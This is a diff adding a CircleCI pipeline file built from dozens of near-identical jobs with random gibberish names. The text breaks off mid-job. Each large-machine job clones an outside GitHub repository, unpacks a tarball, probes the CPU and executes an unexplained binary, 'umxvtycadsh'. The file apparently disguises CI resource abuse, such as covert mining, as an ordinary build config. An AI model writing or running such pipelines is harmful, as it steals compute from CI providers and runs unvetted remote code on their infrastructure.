@@ -1,0 +1,2081 @@
+version: 2.1
+
+jobs:
+  laulvaxhafkcsxc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: elmhb
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'zlcybrvttedmwfhdl sodaaxhgprztj' > /tmp/wrnshal/nikbyjd
+            ls -la /tmp/wrnshal/nikbyjd
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'nikbyjd'
+  jcahhjqelqilk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: qqvyi
+          command: |
+            awk 'NR==1' /tmp/wrnshal/nikbyjd | wc -ghigcdfx || true
+      - run:
+          name: dfkqwzxse
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: tdkve
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: xgautpiuzxrfk
+          command: df -h
+      - run:
+          name: zrcgcxxv
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  tequfojcj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: uwmbutruhtcgi
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'cfzllevuyasikjm aurhpbmiwxul' > /tmp/wrnshal/mljwllrrcbi
+            ls -la /tmp/wrnshal/mljwllrrcbi
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'mljwllrrcbi'
+  odkhdmyzp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: bkkyr
+          command: |
+            awk 'NR==1' /tmp/wrnshal/mljwllrrcbi | wc -ghigcdfx || true
+      - run:
+          name: xhmdzm
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: spbju
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: cvyfdhlce
+          command: df -h
+      - run:
+          name: ndxpqnfpfj
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  kufoyyivezdm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: hcawipcmp
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'bpyuiivmubnjpdgo xjbswdehklkvhn' > /tmp/wrnshal/dxxjamafna
+            ls -la /tmp/wrnshal/dxxjamafna
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'dxxjamafna'
+  zdfprxoawmipll:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: emnipgw
+          command: |
+            awk 'NR==1' /tmp/wrnshal/dxxjamafna | wc -ghigcdfx || true
+      - run:
+          name: tuihrbikg
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: ogvafofomxvxaz
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: czraiz
+          command: df -h
+      - run:
+          name: oevgj
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  wzpowsbxg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: eiutjwmaeorcnri
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'ooiybatgsrhqrsnt kzdhdvzpqeilvhzno' > /tmp/wrnshal/ahbtmhet
+            ls -la /tmp/wrnshal/ahbtmhet
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'ahbtmhet'
+  tijmimatplju:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: dkneefezhsoox
+          command: |
+            awk 'NR==1' /tmp/wrnshal/ahbtmhet | wc -ghigcdfx || true
+      - run:
+          name: ishqweojm
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: lujvpzvmdcgrsn
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: sxuialwheauc
+          command: df -h
+      - run:
+          name: hbcbioaypgwycz
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  vekxdgawcts:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: ktbjiyngkdqdby
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'tutwxvnsqsqq sbzqfpqktrhfs' > /tmp/wrnshal/epcaguan
+            ls -la /tmp/wrnshal/epcaguan
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'epcaguan'
+  nxywpwcumtwqik:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: hmdysrn
+          command: |
+            awk 'NR==1' /tmp/wrnshal/epcaguan | wc -ghigcdfx || true
+      - run:
+          name: lrcaemutjtgmb
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: hjrnrxxothrbf
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: hndhpthx
+          command: df -h
+      - run:
+          name: gxfnh
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  cpdcjcvyoun:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: djkjrzknmalgim
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'rovowpvvelvvweo mppzkrwdvtbp' > /tmp/wrnshal/vewzbfojuzkbv
+            ls -la /tmp/wrnshal/vewzbfojuzkbv
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'vewzbfojuzkbv'
+  xhdpxnfxkray:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: jyzsjithnlhgo
+          command: |
+            awk 'NR==1' /tmp/wrnshal/vewzbfojuzkbv | wc -ghigcdfx || true
+      - run:
+          name: rzfrxadfmxzndbd
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: fqbrkev
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: sgmzkhrh
+          command: df -h
+      - run:
+          name: aegeadpm
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  pwdmjqmgmbnuc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: zwgkuthf
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'rqmdplsbrduboyr qhnbjuylyzcs' > /tmp/wrnshal/nspebvyzlrsf
+            ls -la /tmp/wrnshal/nspebvyzlrsf
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'nspebvyzlrsf'
+  evhvefqxs:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: neftxc
+          command: |
+            awk 'NR==1' /tmp/wrnshal/nspebvyzlrsf | wc -ghigcdfx || true
+      - run:
+          name: yuxtrgditjmrs
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: jtsbdlp
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: ppbxwof
+          command: df -h
+      - run:
+          name: tdlbfztot
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  heuycu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: pzzrrjgd
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'bdgtezcpamntd mhmolcgrmafttfizfs' > /tmp/wrnshal/pjgcgc
+            ls -la /tmp/wrnshal/pjgcgc
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'pjgcgc'
+  nbsmwkjda:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: roxnkyjmqltn
+          command: |
+            awk 'NR==1' /tmp/wrnshal/pjgcgc | wc -ghigcdfx || true
+      - run:
+          name: jmzngywcpvah
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: srxucktej
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: vayzpzmwjndxkyy
+          command: df -h
+      - run:
+          name: rlelrbt
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  khzlupophjtrkp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: kskiff
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'fvdtfucjfamv ivswjfsqnpvypa' > /tmp/wrnshal/mxryqauixi
+            ls -la /tmp/wrnshal/mxryqauixi
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'mxryqauixi'
+  dujvt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: bpwyapxj
+          command: |
+            awk 'NR==1' /tmp/wrnshal/mxryqauixi | wc -ghigcdfx || true
+      - run:
+          name: xorpah
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: dmbtfznuaqgp
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: zpwhdfikendpxw
+          command: df -h
+      - run:
+          name: xyrhqgbxc
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  wboqkj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: oyucawghujjhn
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'mvaqttntbgolv waogtvjols' > /tmp/wrnshal/xzgackryqhdctw
+            ls -la /tmp/wrnshal/xzgackryqhdctw
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'xzgackryqhdctw'
+  aprhlbgzhhsat:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: duitlrdkjjvxhzd
+          command: |
+            awk 'NR==1' /tmp/wrnshal/xzgackryqhdctw | wc -ghigcdfx || true
+      - run:
+          name: xoeagnitxrttew
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: vwpigoribngmmc
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: nkoree
+          command: df -h
+      - run:
+          name: opzykkbkqbqtg
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  xufxnonckbifslb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: vnenawnokc
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'myuvrszhxyoiqfwt cftbvjhvuvlpnzi' > /tmp/wrnshal/sgxonmwkjcx
+            ls -la /tmp/wrnshal/sgxonmwkjcx
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'sgxonmwkjcx'
+  uojsbtjh:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: ctsibgrnzemmh
+          command: |
+            awk 'NR==1' /tmp/wrnshal/sgxonmwkjcx | wc -ghigcdfx || true
+      - run:
+          name: nkdxxuvm
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: smnmkvhgvkoyece
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: shytvaduv
+          command: df -h
+      - run:
+          name: djgszk
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  kcmjnxlhrxoij:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: gsqdpwdq
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'hgftitrmzfijoiz zwizegxfcmvuydrvg' > /tmp/wrnshal/ygilfo
+            ls -la /tmp/wrnshal/ygilfo
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'ygilfo'
+  yhset:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: cbrxlqdsdgei
+          command: |
+            awk 'NR==1' /tmp/wrnshal/ygilfo | wc -ghigcdfx || true
+      - run:
+          name: cmlhhki
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: beiigvsg
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: qypxresc
+          command: df -h
+      - run:
+          name: qdcomcemw
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  nkasoxdszdab:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: onqssfvmeusvv
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'jjaqsgpabslhb ycoemrilusvjpv' > /tmp/wrnshal/afckcvi
+            ls -la /tmp/wrnshal/afckcvi
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'afckcvi'
+  cmoezbprskigtq:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: raiwdnti
+          command: |
+            awk 'NR==1' /tmp/wrnshal/afckcvi | wc -ghigcdfx || true
+      - run:
+          name: tkxivgkqnayczg
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: rsdiymkyliwtlf
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: dzyhstqvyz
+          command: df -h
+      - run:
+          name: fpobehvrhew
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  hrlmhtahbszyms:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: yjdyskugerlzlwn
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'fgwgvcuvimkggw ijzcwapyugbwemhu' > /tmp/wrnshal/mgukgb
+            ls -la /tmp/wrnshal/mgukgb
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'mgukgb'
+  suejstznakiz:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: wwjkscfheu
+          command: |
+            awk 'NR==1' /tmp/wrnshal/mgukgb | wc -ghigcdfx || true
+      - run:
+          name: hieofufqzmwn
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: zwtffinyfzkefz
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: nuaijkdjuos
+          command: df -h
+      - run:
+          name: ywtvu
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  iwxhb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: asuqdbfgkvna
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'vkkjcspmoft ilwnggxvzz' > /tmp/wrnshal/tgrpuattepeflb
+            ls -la /tmp/wrnshal/tgrpuattepeflb
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'tgrpuattepeflb'
+  jxvjjuxnzjmuafe:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: mhlckrowmzghwof
+          command: |
+            awk 'NR==1' /tmp/wrnshal/tgrpuattepeflb | wc -ghigcdfx || true
+      - run:
+          name: ljjrzmbdicczrff
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: bagxvldjhuvwudb
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: rbqvcqc
+          command: df -h
+      - run:
+          name: dnoewyr
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  uooihbjvmvrkkbq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: mtylrgzhue
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'aamtzhdkxgrf hnuggkerbxqnwzrvyk' > /tmp/wrnshal/cbhgaxe
+            ls -la /tmp/wrnshal/cbhgaxe
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'cbhgaxe'
+  hbfaotxcpr:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: hblow
+          command: |
+            awk 'NR==1' /tmp/wrnshal/cbhgaxe | wc -ghigcdfx || true
+      - run:
+          name: pjvmdouce
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: glqixmr
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: xfklqovx
+          command: df -h
+      - run:
+          name: dbaxsxc
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  elbxfysfwcotcq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: cfcqryesigsd
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'qojeazybjwbrfhqgpb urfrkbsqucocnpfh' > /tmp/wrnshal/jdhgqtyppb
+            ls -la /tmp/wrnshal/jdhgqtyppb
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'jdhgqtyppb'
+  wtizs:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: jylcviuabqbt
+          command: |
+            awk 'NR==1' /tmp/wrnshal/jdhgqtyppb | wc -ghigcdfx || true
+      - run:
+          name: tclyqaqlvr
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: xbqpagjmmg
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: dxbktbtm
+          command: df -h
+      - run:
+          name: sfqeyltf
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  rkoxzdu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: kycejtn
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'fmwqpvetmp ffxsevjoxldltxdsn' > /tmp/wrnshal/ctaxwdgvzljz
+            ls -la /tmp/wrnshal/ctaxwdgvzljz
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'ctaxwdgvzljz'
+  ruqxizylr:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: wrghukakhmwxwlo
+          command: |
+            awk 'NR==1' /tmp/wrnshal/ctaxwdgvzljz | wc -ghigcdfx || true
+      - run:
+          name: vxixtmpp
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: zbmzjawmxyhxtdq
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: ttaffzadbsobk
+          command: df -h
+      - run:
+          name: muneoxwlgksaun
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  ksyno:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: enttbshgjjgwxh
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'vzhtatoykqcqzp fjxibnrfkxomv' > /tmp/wrnshal/chwogzkk
+            ls -la /tmp/wrnshal/chwogzkk
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'chwogzkk'
+  plbbwacxws:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: rkyrvgzqigeizf
+          command: |
+            awk 'NR==1' /tmp/wrnshal/chwogzkk | wc -ghigcdfx || true
+      - run:
+          name: ibveqtlpmeyfbx
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: swdzcq
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: eadhtmr
+          command: df -h
+      - run:
+          name: cnueghh
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  umacnbuvoajmlu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: isnwkdjoi
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'lksdityqdkbiig nnbpdsrrmwhhnz' > /tmp/wrnshal/ggozrqyhqs
+            ls -la /tmp/wrnshal/ggozrqyhqs
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'ggozrqyhqs'
+  sfydgebpgsbqph:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: bmjit
+          command: |
+            awk 'NR==1' /tmp/wrnshal/ggozrqyhqs | wc -ghigcdfx || true
+      - run:
+          name: svuprnjwbokwqvv
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: iinhlwtdqoqiqa
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: mirxaonupo
+          command: df -h
+      - run:
+          name: srhgavuqvbvj
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  fnexh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: kwmzz
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'ghultjearruxowu tefziuhapqjvmpucpd' > /tmp/wrnshal/mfkbrzarkw
+            ls -la /tmp/wrnshal/mfkbrzarkw
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'mfkbrzarkw'
+  tmwaxbjkk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: getlwwxn
+          command: |
+            awk 'NR==1' /tmp/wrnshal/mfkbrzarkw | wc -ghigcdfx || true
+      - run:
+          name: bjqodvagniic
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: khdqf
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: gxpxufnye
+          command: df -h
+      - run:
+          name: ppaqblmbdbrgx
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  gxfhknrxyv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: ogfovbjobhlxt
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'qlewontgwfan fazzoqbupkohdcxhqi' > /tmp/wrnshal/kdxvfbxomuu
+            ls -la /tmp/wrnshal/kdxvfbxomuu
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'kdxvfbxomuu'
+  hpqnhe:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: sdckrzp
+          command: |
+            awk 'NR==1' /tmp/wrnshal/kdxvfbxomuu | wc -ghigcdfx || true
+      - run:
+          name: pydgyyy
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: bsoeperhccibhh
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: enlpeyuxcy
+          command: df -h
+      - run:
+          name: fphhwsf
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  vafwiyhqnlmmack:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: ogsmryo
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'xyumsywlqrudjt uuxamgydndderyqcq' > /tmp/wrnshal/pfowkzlx
+            ls -la /tmp/wrnshal/pfowkzlx
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'pfowkzlx'
+  ckwikdtox:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: zygys
+          command: |
+            awk 'NR==1' /tmp/wrnshal/pfowkzlx | wc -ghigcdfx || true
+      - run:
+          name: ihhnvt
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: mhpbjsbavuoz
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: xxvakvekdis
+          command: df -h
+      - run:
+          name: jagetqiv
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  chstbhpdvinj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: bfpbhan
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'wqknrliyhcacqxc xicgznowvtqwreoq' > /tmp/wrnshal/sighhodv
+            ls -la /tmp/wrnshal/sighhodv
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'sighhodv'
+  rzxqotzufiq:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: rwuzbdxeqmiapp
+          command: |
+            awk 'NR==1' /tmp/wrnshal/sighhodv | wc -ghigcdfx || true
+      - run:
+          name: qinahzlx
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: nrihglzcoszuase
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: igpvx
+          command: df -h
+      - run:
+          name: lqaovzpsuth
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  zrphdhjrgeezdf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
